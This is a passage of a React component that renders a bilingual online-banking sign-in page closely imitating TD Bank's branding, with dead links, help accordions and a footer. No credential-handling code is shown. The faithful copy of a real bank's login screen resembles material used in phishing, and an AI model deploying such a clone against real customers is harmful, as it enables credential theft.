                      className="absolute bottom-full left-1/2 -translate-x-1/2 mb-3 w-[280px] p-3.5 bg-white border border-[#d8d8d8] rounded-[4px] shadow-[0_4px_12px_rgba(0,0,0,0.12)] z-30 text-[14px] text-[#555] leading-normal animate-fade-in"
                    >
                      {lang === 'fr'
                        ? "Si vous êtes sur un appareil de confiance, cochez cette case pour enregistrer votre nom d'utilisateur."
                        : "If you're on a trusted device, check this box to save your username for future sign-ins."
                      }
                      <div className="absolute top-full left-1/2 -translate-x-1/2 -mt-[5px] w-2.5 h-2.5 bg-white border border-t-0 border-l-0 border-[#d8d8d8] rotate-45" />
                    </div>
                  )}
                </div>
              </div>

              {/* Login button (Full-width on mobile, compact on desktop) */}
              <button
                type="submit"
                disabled={isLoading}
                className={`w-full md:w-fit md:min-w-[150px] h-11 px-7 py-2.5 text-white border-none rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-colors duration-200 ${
                  isLoading ? 'bg-[#4a9b61] cursor-not-allowed' : 'bg-[#1a7b3a] hover:bg-[#155e2c] cursor-pointer'
                }`}
              >
                {isLoading ? (
                  <>
                    <svg className="animate-spin w-4 h-4" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    <span>{t.signingIn}</span>
                  </>
                ) : (
                  <>
                    <svg viewBox="0 0 24 24" className="w-4 h-4 fill-white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                    <span>{t.signIn}</span>
                  </>
                )}
              </button>

              {/* Forgot password */}
              <a href="#" className="hover-underline inline-block mt-4 text-[#1a7b3a] text-[15px] no-underline" onClick={e => e.preventDefault()}>
                {t.forgotPassword}
              </a>

              {/* Security note */}
              <div className="flex items-start gap-2 mt-4.5 text-[14px] text-[#444]">
                <svg viewBox="0 0 24 24" className="w-5 h-5 fill-[#1a5c2a] shrink-0 mt-[2px]">
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
                <span>
                  {t.securityNote}{' '}
                  <a href="#" className="hover-underline text-[#1a7b3a]" onClick={e => e.preventDefault()}>{t.securityLink}</a>
                </span>
              </div>
            </form>
          </div>

          {/* ── RIGHT: info panel ── */}
          <div className="bg-white md:bg-transparent md:border-none rounded-[8px] md:rounded-none px-0 md:px-10 pt-6 md:pt-9 pb-6 md:pb-10 shadow-sm md:shadow-none">
            <div className="flex flex-col md:flex-row md:items-start justify-between mb-7 gap-4 px-4 md:px-0">
              <h2 className="text-[21px] font-normal text-[#222] leading-snug flex-1 m-0 whitespace-pre-line">
                {t.welcomeTitle}
              </h2>
              <button
                type="button"
                onClick={() => alert(lang === 'fr' ? "L'inscription n'est pas disponible pour le moment." : 'Registration is currently unavailable.')}
                className="w-full md:w-auto whitespace-normal md:whitespace-pre-line text-center border-[1.5px] border-[#1a5c2a] bg-white text-[#1a5c2a] text-[15px] font-medium px-4 py-3 md:py-[9px] rounded-[4px] cursor-pointer transition-colors duration-200 shrink-0 hover:bg-[#1a5c2a] hover:text-white"
              >
                {t.registerBtn}
              </button>
            </div>

            <p className="text-[14.5px] text-[#444] leading-relaxed mb-7 px-4 md:px-0">
              {t.registerDesc}
            </p>

            <hr className="border-t border-[#d8d8d8] my-0 md:mb-5 w-full" />

            {/* Login Help Accordion */}
            <div className="w-full bg-white md:bg-transparent md:mb-6.5">
              {/* Mobile Accordion Header */}
              <button
                type="button"
                onClick={() => setLoginHelpExpanded(!loginHelpExpanded)}
                className="flex items-center gap-3 w-full text-left bg-transparent border-none py-4.5 px-4 cursor-pointer md:hidden"
              >
                <AccordionIcon expanded={loginHelpExpanded} />
                <span className="text-lg font-normal text-[#222]">
                  {t.loginHelp}
                </span>
              </button>

              {/* Desktop Header */}
              <h3 className="hidden md:block text-lg font-medium text-[#222] mb-2.5">{t.loginHelp}</h3>

              {/* Accordion Content */}
              <div className={`mt-0 md:mt-0 pl-8 pr-4 md:pl-0 pb-5 md:pb-0 ${loginHelpExpanded ? 'block' : 'hidden md:block'}`}>
                <a href="#" className="hover-underline block text-[#1a7b3a] text-[15px] mb-2.5 md:mb-1.5 no-underline" onClick={e => e.preventDefault()}>{t.getLoginHelp}</a>
                <a href="#" className="hover-underline block text-[#1a7b3a] text-[15px] mb-0 md:mb-1.5 no-underline" onClick={e => e.preventDefault()}>{t.resetPassword}</a>
              </div>
            </div>

            <hr className="border-t border-[#d8d8d8] my-0 md:mb-5 w-full" />

            {/* Enhanced Security Accordion */}
            <div className="w-full bg-white md:bg-transparent md:mb-6.5">
              {/* Mobile Accordion Header */}
              <button
                type="button"
                onClick={() => setSecurityExpanded(!securityExpanded)}
                className="flex items-center gap-3 w-full text-left bg-transparent border-none py-4.5 px-4 cursor-pointer md:hidden"
              >
                <AccordionIcon expanded={securityExpanded} />
                <span className="text-lg font-normal text-[#222]">
                  {t.enhancedSecurity}
                </span>
              </button>

              {/* Desktop Header */}
              <h3 className="hidden md:block text-lg font-medium text-[#222] mb-2.5">{t.enhancedSecurity}</h3>

              {/* Accordion Content */}
              <div className={`mt-0 md:mt-0 pl-8 pr-4 md:pl-0 pb-5 md:pb-0 ${securityExpanded ? 'block' : 'hidden md:block'}`}>
                <a href="#" className="hover-underline block text-[#1a7b3a] text-[15px] mb-2.5 md:mb-1.5 no-underline" onClick={e => e.preventDefault()}>{t.twoStepFaq}</a>
                <a href="#" className="hover-underline block text-[#1a7b3a] text-[15px] mb-0 md:mb-1.5 no-underline" onClick={e => e.preventDefault()}>{t.improveProtection}</a>
              </div>
            </div>

            <hr className="border-t border-[#d8d8d8] my-0 md:mb-5 w-full" />

            {/* Mobile banking */}
            <div className="mb-0 px-4 md:px-0 pt-5 pb-5 md:pt-0 md:pb-0">
              <h3 className="text-lg font-medium text-[#222] mb-2.5">{t.mobileTitle}</h3>
              <a href="#" className="hover-underline block text-[#1a7b3a] text-[15px] no-underline" onClick={e => e.preventDefault()}>{t.mobileDesc}</a>
            </div>
          </div>
        </div>
      </div>

      {/* ── Legal ── */}
      <div className=" max-w-[1080px] mx-auto px-4 md:px-5 pb-7 w-full box-border">
        <p className="text-[14px] text-[#333] leading-relaxed text-start m-0">
          {t.disclaimerStart}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.financialServicesTerms}</a>
          {t.disclaimerMid1}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.accessAgreement}</a>
          {t.disclaimerMid2}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.digitalBankingAgreement}</a>
          {t.disclaimerMid3}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.businessAccessServicesSchedule}</a>
          {t.disclaimerMid4}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.termsAndAgreement}</a>
          {t.disclaimerAnd}
          <a href="#" className="hover-underline text-[#1a7b3a] underline" onClick={e => e.preventDefault()}>{t.disclosure}</a>
          {t.disclaimerEnd}
        </p>
      </div>

      {/* ── Footer ── */}
      <footer className="bg-[#174B30] overflow-hidden mt-auto pt-7.5 pb-10">
        <div className="max-w-[1080px] mx-auto px-5 w-full box-border relative">
          
          {/* Armchair on the left (Desktop only) */}
          <div className="hidden md:block absolute -left-[130px] top-[calc(50%-50px)] -translate-y-1/2 pointer-events-none">
            <img src="/footer_seat.png" alt="TD Armchair" className="h-[380px] block" />
          </div>

          {/* Top: Armchair & CTA */}
          <div className="flex flex-col items-center justify-center mb-6 text-center">
            <div className="flex flex-col md:flex-row items-center gap-1 md:gap-2 text-[28px] text-white font-light">
              <span>{t.talkToUs}</span>
              <a href="#" className="hover-underline text-[#8df2a6] font-medium no-underline flex items-center gap-1 text-[28px]" onClick={e => e.preventDefault()}>
                {t.contactUs} <span className="text-[24px] -translate-y-[1px] inline-block">›</span>
              </a>
            </div>
          </div>

          {/* Social Title & Icons */}
          <div className="flex flex-col items-center justify-center mb-7.5">
            <span className="text-white text-base mb-3.5 font-normal opacity-90">{t.connectTitle}</span>
            <div className="flex gap-4 justify-center">
              {[
                {
                  name: 'Twitter',
                  icon: (
                    <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                      <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
                    </svg>
                  )
                },
                {
                  name: 'Facebook',
                  icon: (
                    <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                      <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c4.56-.93 8-4.96 8-9.75z"/>
                    </svg>
                  )
                },
                {
                  name: 'Instagram',
                  icon: (
                    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
                      <path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"/>
                      <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
                    </svg>
                  )
                },
                {
                  name: 'YouTube',
                  icon: (
                    <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                      <path d="M23.498 6.163a3.003 3.003 0 00-2.11-2.108C19.528 3.545 12 3.545 12 3.545s-7.528 0-9.388.51a3.003 3.003 0 00-2.11 2.108C0 8.022 0 12 0 12s0 3.978.502 5.837a3.003 3.003 0 002.11 2.108c1.86.51 9.388.51 9.388.51s7.528 0 9.388-.51a3.003 3.003 0 002.11-2.108c.502-1.859.502-5.837.502-5.837s0-3.978-.502-5.837zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                    </svg>
                  )
                },
                {
                  name: 'LinkedIn',
                  icon: (
                    <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                      <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.779-1.75-1.75s.784-1.75 1.75-1.75 1.75.779 1.75 1.75-.784 1.75-1.75 1.75zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
                    </svg>
                  )
                }
              ].map((social) => (
                <a
                  key={social.name}
                  href="#"
                  onClick={e => e.preventDefault()}
                  className="w-[52px] h-[52px] rounded-full bg-[#0d3220] flex items-center justify-center text-white no-underline border-2 border-[#1a7b3a] transition-colors duration-200 hover:bg-[#154e33]"
                  title={social.name}
                >
                  {social.icon}
                </a>
              ))}
            </div>
          </div>

          {/* Bottom links (with divider above) */}
          <div className="flex flex-col md:flex-row md:flex-wrap items-center justify-center gap-y-4 md:gap-x-7 md:gap-y-3 pt-6 text-center">
            {(lang === 'fr'
              ? [
                  { label: 'Confidentialité et sécurité', key: 'privacy' },
                  { label: 'Avis juridique', key: 'legal' },
                  { label: 'Accessibilité', key: 'accessibility' },
                  { label: 'Membre de la SADC', key: 'cdic' },
                  { label: 'À propos de la TD', key: 'about' },
                  { label: 'Carrières', key: 'hiring' },
                  { label: 'Index du site', key: 'siteIndex' }
                ]
              : [
                  { label: 'Privacy and Security', key: 'privacy' },
                  { label: 'Legal', key: 'legal' },
                  { label: 'Accessibility', key: 'accessibility' },
                  { label: 'CDIC member', key: 'cdic' },
                  { label: 'About Us', key: 'about' },
                  { label: "We're Hiring", key: 'hiring' },
                  { label: 'Site Index', key: 'siteIndex' }
                ]
            ).map((link) => (
              <a
                key={link.key}
                href="#"
                className="hover-underline text-white text-[17px] md:text-base no-underline leading-tight"
                onClick={e => e.preventDefault()}
              >
                {link.label}
              </a>
            ))}
          </div>

          {/* Mobile-only Armchair centered at the bottom */}
          <div className="flex md:hidden justify-center -mt-16">
            <img src="/footer_seat.png" alt="TD Armchair" className="h-[240px] block" />
          </div>

        </div>
      </footer>
    </div>
  );
}
